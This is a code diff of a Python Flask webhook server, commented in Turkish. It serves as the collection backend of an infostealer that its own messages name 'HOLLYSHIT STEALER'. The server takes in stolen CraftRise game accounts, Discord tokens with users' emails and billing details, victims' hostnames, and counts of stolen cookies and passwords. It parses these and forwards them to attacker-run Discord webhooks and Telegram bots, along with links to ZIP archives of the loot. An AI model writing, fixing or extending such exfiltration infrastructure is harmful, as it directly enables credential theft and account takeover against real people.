@@ -21,91 +21,112 @@ MASTER_WEBHOOK = os.environ.get("MASTER_WEBHOOK", "")
 MASTER_TELEGRAM_TOKEN = os.environ.get("MASTER_TELEGRAM_TOKEN", "")
 MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")
 
-def send_discord(url, content, embeds=None):
+def send_discord(url, data):
     if not url:
         return
     try:
-        payload = {"content": content}
-        if embeds:
-            payload["embeds"] = embeds
-        requests.post(url, json=payload, timeout=30)
+        if isinstance(data, str):
+            requests.post(url, json={"content": data}, timeout=30)
+        else:
+            requests.post(url, json=data, timeout=30)
     except Exception as e:
         print(f"Discord hatası: {e}")
 
 def send_telegram(token, chat_id, msg):
     if token and chat_id and msg:
         try:
+            if len(msg) > 4000:
+                msg = msg[:4000] + "..."
             requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                          json={"chat_id": chat_id, "text": msg}, timeout=30)
-        except:
-            pass
+        except Exception as e:
+            print(f"Telegram hatası: {e}")
+
+def extract_craftrise_account(content):
+    """CraftRise hesabını content'ten çıkar"""
+    match = re.search(r'`([^`]+)`', content)
+    if match:
+        return match.group(1)
+    return content
+
+def extract_discord_info(content):
+    """Discord token bilgilerini content'ten çıkar"""
+    user_match = re.search(r'\*\*User:\*\* `([^`]+)`', content)
+    token_match = re.search(r'\*\*Token:\*\* `([^`]+)`', content)
+    email_match = re.search(r'\*\*Email:\*\* `([^`]+)`', content)
+    billing_match = re.search(r'\*\*Billing:\*\* `([^`]+)`', content)
+    return {
+        "user": user_match.group(1) if user_match else "Unknown",
+        "token": token_match.group(1) if token_match else "Unknown",
+        "email": email_match.group(1) if email_match else "Unknown",
+        "billing": billing_match.group(1) if billing_match else "None"
+    }
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
     try:
         data = request.get_json()
         log_type = data.get("type", "unknown")
-        payload = data.get("data", data)
         
         print(f"[{datetime.now()}] Type: {log_type}")
         
-        # ============ CRAFTRISE (Sadece CraftRise hesabı) ============
+        # ============ CRAFTRISE ============
         if log_type == "craftrise":
-            content = payload.get("content", str(payload))
-            send_discord(CRAFTRISE_WEBHOOK, content)
+            payload = data.get("data", data)
+            send_discord(CRAFTRISE_WEBHOOK, payload)
             
-            # Telegram için sadece hesap bilgisi
-            match = re.search(r'`([^`]+)`', content)
-            if match:
-                tg_msg = f"🎮 CraftRise Hesabı!\n```\n{match.group(1)}\n```"
-                send_telegram(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, tg_msg)
+            content = payload.get("content", "")
+            account = extract_craftrise_account(content)
+            tg_msg = f"🎮 **CraftRise Hesabı!**\n```\n{account}\n```"
+            send_telegram(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, tg_msg)
         
-        # ============ DISCORD TOKEN (Sadece token) ============
+        # ============ DISCORD TOKEN ============
         elif log_type == "discord":
-            content = payload.get("content", str(payload))
-            send_discord(DISCORD_WEBHOOK, content)
-            send_telegram(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, content[:500])
+            payload = data.get("data", data)
+            send_discord(DISCORD_WEBHOOK, payload)
+            
+            content = payload.get("content", "")
+            info = extract_discord_info(content)
+            tg_msg = f"💎 **Discord Token!**\n\n👤 **User:** {info['user']}\n🔑 **Token:** `{info['token'][:40]}...`\n📧 **Email:** {info['email']}"
+            send_telegram(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, tg_msg)
         
-        # ============ BROWSER / GLOBAL (HER ŞEY TEK MESAJDA) ============
+        # ============ BROWSER / MASTER (3 EMBED'Lİ TEK MESAJ) ============
         else:
-            # Payload'dan verileri çek
-            username = payload.get("username", "Unknown")
-            hostname = payload.get("hostname", "Unknown")
-            craftrise = payload.get("craftrise", "None")
-            token_info = payload.get("first_token", {})
-            download_url = payload.get("download_url", "")
-            cookies = payload.get("cookies", 0)
-            passwords = payload.get("passwords", 0)
+            payload = data.get("data", data)
             
-            # Discord mesajını oluştur
-            msg = f"@everyone `{username}` - `{hostname}`\n🎮 **CraftRise:** `{craftrise}`\n\n"
+            # Discord'a gönder (master webhook)
+            send_discord(MASTER_WEBHOOK, payload)
             
-            if token_info:
-                msg += f"**{token_info.get('user', 'Unknown')} ({token_info.get('id', 'ID')})**\n"
-                msg += f"- 🔑 **Token:** `{token_info.get('token', 'None')[:50]}...`\n"
-                msg += f"- 👤 **Username:** {token_info.get('user', 'Unknown')}\n"
-                msg += f"- 🎖️ **Badges:** {token_info.get('badges', 'None')}\n"
-                msg += f"- 💳 **Billings:** {token_info.get('billing', 'None')}\n"
-                msg += f"- 📧 **Email:** {token_info.get('email', 'None')}\n"
-                msg += f"- 📱 **Phone:** {token_info.get('phone', 'None')}\n\n"
+            # Telegram için düz metin oluştur
+            tg_msg = "🕸️ **HOLLYSHIT STEALER - FULL REPORT**\n\n"
             
-            msg += f"📊 **Analysis Stats**\n- 🍪 **Cookies:** {cookies}\n- 🔑 **Passwords:** {passwords}\n"
+            # Content'ten kullanıcı bilgisi
+            content = payload.get("content", "")
+            if content:
+                tg_msg += f"{content}\n\n"
             
-            if download_url:
-                msg += f"\n📥 **Download:** [Click Here to Download ZIP]({download_url})"
+            # Embedlerden bilgileri çek
+            embeds = payload.get("embeds", [])
+            for embed in embeds:
+                title = embed.get("title", "")
+                if title:
+                    tg_msg += f"**{title}**\n"
+                
+                fields = embed.get("fields", [])
+                for field in fields:
+                    name = field.get("name", "")
+                    value = field.get("value", "")
+                    # HTML taglerini ve emoji kodlarını temizle
+                    value = re.sub(r'<[^>]+>', '', value)
+                    value = re.sub(r'<a?:[a-zA-Z_]+:\d+>', '', value)
+                    tg_msg += f"• {name}: {value}\n"
+                tg_msg += "\n"
             
-            # Discord'a gönder (Master webhook)
-            send_discord(MASTER_WEBHOOK, msg)
+            # URL varsa ekle
+            if payload.get("url"):
+                tg_msg += f"📥 **Download:** {payload['url']}\n"
             
-            # Telegram'a da gönder (düz metin, markdown yok)
-            tg_msg = f"🕸️ HOLLYSHIT STEALER\n\n👤 Kullanıcı: {username}\n💻 Bilgisayar: {hostname}\n🎮 CraftRise: {craftrise}\n\n"
-            if token_info:
-                tg_msg += f"📌 Discord Token:\n👤 {token_info.get('user', 'Unknown')}\n📧 {token_info.get('email', 'None')}\n🔑 {token_info.get('token', 'None')[:40]}...\n\n"
-            tg_msg += f"📊 İstatistikler:\n🍪 Çerez: {cookies}\n🔑 Şifre: {passwords}\n"
-            if download_url:
-                tg_msg += f"\n📥 ZIP İndir: {download_url}"
-            
-            send_telegram(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, tg_msg)
+            send_telegram(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, tg_msg.strip())
         
         return jsonify({"status": "ok"}), 200
         
